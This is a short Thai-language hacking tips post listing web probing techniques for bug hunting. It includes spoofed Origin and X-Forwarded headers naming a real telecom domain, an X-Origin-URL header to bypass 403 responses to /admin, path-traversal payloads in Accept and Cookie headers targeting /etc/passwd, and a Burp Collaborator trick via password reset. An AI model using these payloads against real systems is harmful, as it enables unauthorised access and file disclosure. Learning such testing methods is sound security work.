---
title: ลองเเฮ้กเบิ่ง พะนา
date: '2021-01-29'
path: /post/try-to-do-this
tags: hacking
layout: post
---

#### HTTP Header

ค้นหาช่องโหว่โดยการเปลี่ยน HTTP Header

```
Accept: application/json, text/javascript, */*; q=0.01
```

เจ้าลองเพิ่ม HTTP Header อันนี่เด้อ

```
Origin: example.com // หึว่ากะลังทดสอบ ais.co.th ยุพะนะ ลอง Origin: example.ais.co.th, exmaple.ais.co.th.net
X-Forwarded-For:
X-Forwarded-Host:
X-Forwarded-Photo:
X-Origin-URL: /admin \\ ลองถึงมันตอบกลับมา 403,401 กะลองใส่อันนี่เบิ่ง ลองถือมันตอบกลับมา 200
Accept: ../../../../../../../../../../etc/passwd{{
Cookie: usid=../../../../../../../../../../../../etc/passwd
/server-status?full
```

#### ภาคผนวก

เจ้าเฮ้ดจั่งได่กะได้ ให้ JavaScript files มันอ่านง่ายๆ ละกะลองหาคำนี่เบิ่ง

```js
addEventListener;
postMessage;
eval;
```

สมัครบัญชี email@burp_collab -> Forget password <!= received requests from internal server + SMTP connection details
